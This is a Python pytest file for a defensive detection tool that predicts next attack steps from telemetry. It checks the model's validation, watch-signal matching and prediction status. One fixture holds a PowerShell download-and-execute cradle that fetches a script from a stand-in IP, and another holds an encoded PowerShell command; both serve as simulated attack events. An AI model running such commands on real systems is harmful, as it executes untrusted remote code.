"""F4 engine: curated model validation, watch-signal semantics, prediction status and arrival-order invariance."""

from __future__ import annotations

import json
import random
from collections.abc import Callable
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import pytest
from pydantic import ValidationError

from app.detection.base import Event
from app.detection.builtin import builtin_rules
from app.detection.catalog import default_catalog
from app.prediction.engine import LIKELIHOOD_LABEL, DetectionFact, PredictionDraft, predict
from app.prediction.model import TRANSITIONS_PATH, TransitionModel, TransitionModelError, default_transition_model
from app.prediction.signals import Condition, WatchSignal
from app.response.simulation import PLAYBOOKS

T0 = datetime(2026, 1, 15, 8, 0, tzinfo=UTC)
MODEL = default_transition_model()


def ev(name: str, kind: str, seconds: float, **fields: Any) -> Event:
    return Event(
        id=name,
        source="lab",
        external_id=name,
        digest=f"digest-{name}",
        ts=T0 + timedelta(seconds=seconds),
        kind=kind,
        asset="lab-ws-1",
        username="alex",
        criticality=fields.pop("criticality", 4),
        privileged=fields.pop("privileged", True),
        **fields,
    )


def det(rule_id: str, techniques: tuple[str, ...], stage: str, events: list[Event]) -> DetectionFact:
    return DetectionFact(
        id=f"det-{rule_id}-{events[0].id}",
        rule_id=rule_id,
        techniques=techniques,
        stage=stage,
        first_ts=min(e.ts for e in events),
        last_ts=max(e.ts for e in events),
        event_ids=tuple(e.id for e in events),
    )


FAILURES = [ev(f"f{i}", "auth_failure", i * 6, source_ip="203.0.113.45") for i in range(5)]
SUCCESS = ev("s1", "auth_success", 44, source_ip="203.0.113.45")
POWERSHELL = ev(
    "p1",
    "process_start",
    64,
    process_name="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    command_line="powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAA==",
)
SCAN = [
    ev(f"n{i:02d}", "network_connection", 84 + i * 2, source_ip="10.20.1.15", destination_ip=f"10.20.5.{10 + i}")
    for i in range(12)
]
BRUTE = det("AUTH-001", ("T1110",), "Credential Access", FAILURES)
LOGIN = det("AUTH-002", ("T1078",), "Initial Access", [*FAILURES, SUCCESS])
EXECUTION = det("PROC-001", ("T1059.001",), "Execution", [POWERSHELL])
DISCOVERY = det("NET-001", ("T1046",), "Discovery", SCAN)


def by_technique(drafts: list[PredictionDraft]) -> dict[str, PredictionDraft]:
    return {draft.technique_id: draft for draft in drafts}


def test_curated_model_uses_verified_techniques_rules_and_playbooks() -> None:
    catalog = default_catalog()
    rule_ids = {rule.id for rule in builtin_rules("Defense Impairment")}
    pairs = {(t.source, t.target) for t in MODEL.transitions}
    assert {
        ("T1110", "T1078"),
        ("T1078", "T1059.001"),
        ("T1078", "T1087"),
        ("T1078", "T1021"),
        ("T1059.001", "T1046"),
        ("T1059.001", "T1105"),
        ("T1059.001", "T1003"),
        ("T1046", "T1021"),
        ("T1021", "T1486"),
        ("T1021", "T1041"),
    } <= pairs
    for transition in MODEL.transitions:
        assert transition.source in catalog and transition.target in catalog
    for profile in MODEL.profiles.values():
        assert profile.tactic in catalog.require(profile.technique).tactics
        for signal in profile.watch:
            assert set(signal.rule_ids) <= rule_ids
        for action in profile.actions:
            assert action.playbook is None or action.playbook in PLAYBOOKS
    assert "not a probability" in LIKELIHOOD_LABEL


def write_model(tmp_path: Path, mutate: Callable[[dict[str, Any]], None]) -> Path:
    data = json.loads(TRANSITIONS_PATH.read_text(encoding="utf-8"))
    mutate(data)
    path = tmp_path / "transitions.json"
    path.write_text(json.dumps(data), encoding="utf-8")
    return path


@pytest.mark.parametrize("bad_id", ["T1070.001", "T9999", "t1078", "T1059.1", "TA0002"])
@pytest.mark.parametrize("position", ["from", "to"])
def test_invalid_technique_ids_are_rejected(tmp_path: Path, bad_id: str, position: str) -> None:
    transition = {"from": "T1110", "to": "T1078", "weight": 10, "rationale": "Invalid technique for this test."}
    transition[position] = bad_id
    path = write_model(tmp_path, lambda data: data["transitions"].append(transition))
    with pytest.raises(TransitionModelError, match="technique"):
        TransitionModel.load(path)


def test_profiles_reject_wrong_tactics_and_unknown_playbooks(tmp_path: Path) -> None:
    def wrong_tactic(data: dict[str, Any]) -> None:
        data["profiles"][0]["tactic"] = "Impact"

    def unknown_playbook(data: dict[str, Any]) -> None:
        data["profiles"][0]["actions"].append({"text": "Wipe the host", "playbook": "wipe_disk"})

    with pytest.raises(TransitionModelError, match="tactic"):
        TransitionModel.load(write_model(tmp_path, wrong_tactic))
    with pytest.raises(TransitionModelError, match="playbook"):
        TransitionModel.load(write_model(tmp_path, unknown_playbook))


@pytest.mark.parametrize(
    "condition",
    [
        {"field": "password", "op": "equals", "value": "x"},
        {"field": "command_line", "op": "gt", "value": 3},
        {"field": "domain", "op": "cidr", "value": "10.0.0.0/8"},
        {"field": "source_ip", "op": "cidr", "value": "10.0.0.0/33"},
        {"field": "destination_port", "op": "contains", "value": "44"},
        {"field": "command_line", "op": "regex", "value": "(a+)+"},
        {"field": "command_line", "op": "in", "value": "powershell"},
        {"field": "privileged", "op": "equals", "value": "yes"},
        {"field": "command_line", "op": "contains", "value": []},
    ],
)
def test_invalid_conditions_are_rejected(condition: dict[str, Any]) -> None:
    with pytest.raises(ValidationError):
        Condition.model_validate(condition)


def test_watch_signals_match_case_insensitively_by_network_and_by_rule() -> None:
    powershell = WatchSignal.model_validate(
        {
            "description": "PowerShell",
            "kinds": ["process_start"],
            "conditions": [{"field": "process_name", "op": "contains", "value": ["POWERSHELL", "pwsh"]}],
        }
    )
    assert powershell.matches(POWERSHELL) and not powershell.matches(SUCCESS)
    assert "process_name contains 'POWERSHELL' or 'pwsh'" in powershell.text()
    internal = WatchSignal.model_validate(
        {
            "description": "Internal logon",
            "kinds": ["auth_success"],
            "conditions": [{"field": "source_ip", "op": "cidr", "value": ["10.0.0.0/8"]}],
        }
    )
    assert not internal.matches(SUCCESS)
    assert internal.matches(ev("s2", "auth_success", 50, source_ip="10.20.1.15"))
    by_rule = WatchSignal.model_validate({"description": "Rule fired", "rule_ids": ["PROC-001"]})
    assert by_rule.matches(POWERSHELL, {"PROC-001"}) and not by_rule.matches(POWERSHELL)
    with pytest.raises(ValidationError):
        WatchSignal.model_validate({"description": "Nothing to watch"})
    with pytest.raises(ValidationError):
        WatchSignal.model_validate({"description": "Bad rule", "rule_ids": ["proc-1; drop"]})


def test_brute_force_predicts_valid_account_use() -> None:
    drafts = by_technique(predict(FAILURES, [BRUTE], MODEL))
    assert set(drafts) == {"T1078"}
    login = drafts["T1078"]
    assert login.status(T0 + timedelta(minutes=5)) == "WATCHING"
    assert login.evidence_ids == tuple(e.id for e in FAILURES)
    assert 0 <= login.score <= 100 and login.score == sum(f.points for f in login.factors)
    public = login.public(T0)
    assert public["label"] == "HYPOTHESIS" and public["technique"]["tactic"] == "Initial Access"
    assert "probability" not in json.dumps(public["factors"])


def test_login_is_observed_and_execution_predicted_after_success() -> None:
    drafts = by_technique(predict([*FAILURES, SUCCESS], [BRUTE, LOGIN], MODEL))
    assert drafts["T1078"].status(SUCCESS.ts) == "OBSERVED"
    assert drafts["T1078"].observed_event_ids == ("s1",)
    assert {"T1059.001", "T1087", "T1021"} <= set(drafts)
    assert drafts["T1059.001"].status(SUCCESS.ts) == "WATCHING"


def test_powershell_flips_execution_prediction_to_observed() -> None:
    drafts = by_technique(predict([*FAILURES, SUCCESS, POWERSHELL], [BRUTE, LOGIN, EXECUTION], MODEL))
    execution = drafts["T1059.001"]
    assert execution.status(POWERSHELL.ts) == "OBSERVED"
    assert execution.observed_event_ids == ("p1",) and execution.observed_at == POWERSHELL.ts
    assert {"T1046", "T1105", "T1003"} <= set(drafts)


def test_predictions_do_not_depend_on_arrival_order() -> None:
    events = [*FAILURES, SUCCESS, POWERSHELL, *SCAN]
    detections = [BRUTE, LOGIN, EXECUTION, DISCOVERY]
    now = T0 + timedelta(minutes=10)
    expected = [draft.public(now) for draft in predict(events, detections, MODEL)]
    for seed in range(8):
        rng = random.Random(seed)
        shuffled_events, shuffled_detections = events[:], detections[:]
        rng.shuffle(shuffled_events)
        rng.shuffle(shuffled_detections)
        assert [draft.public(now) for draft in predict(shuffled_events, shuffled_detections, MODEL)] == expected
    observed = {p["technique"]["id"] for p in expected if p["status"] == "OBSERVED"}
    assert observed == {"T1078", "T1059.001", "T1046"}
    corroborated = next(p for p in expected if p["technique"]["id"] == "T1021")
    assert {s["technique_id"] for s in corroborated["sources"]} == {"T1078", "T1046"}


def test_unobserved_predictions_expire_and_late_matches_do_not_count() -> None:
    login = by_technique(predict(FAILURES, [BRUTE], MODEL))["T1078"]
    assert login.status(login.expires_at + timedelta(seconds=1)) == "EXPIRED"
    late = ev("s9", "auth_success", (login.expires_at - T0).total_seconds() + 60, source_ip="203.0.113.45")
    late_login = by_technique(predict([*FAILURES, late], [BRUTE], MODEL))["T1078"]
    assert late_login.observed_event_ids == ()


def test_source_evidence_never_counts_as_an_observation() -> None:
    download = ev(
        "p2",
        "process_start",
        64,
        process_name="powershell.exe",
        command_line="powershell IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')",
    )
    drafts = by_technique(predict([download], [det("PROC-001", ("T1059.001",), "Execution", [download])], MODEL))
    assert drafts["T1105"].observed_event_ids == ()


def test_steps_seen_before_their_predecessor_are_not_predicted() -> None:
    early = ev("p0", "process_start", -120, process_name="powershell.exe", command_line="powershell.exe -enc AAAA")
    early_execution = det("PROC-001", ("T1059.001",), "Execution", [early])
    drafts = by_technique(predict([early, *FAILURES, SUCCESS], [early_execution, BRUTE, LOGIN], MODEL))
    assert "T1059.001" not in drafts
    assert predict([], [], MODEL) == [] and predict(FAILURES, [], MODEL) == []
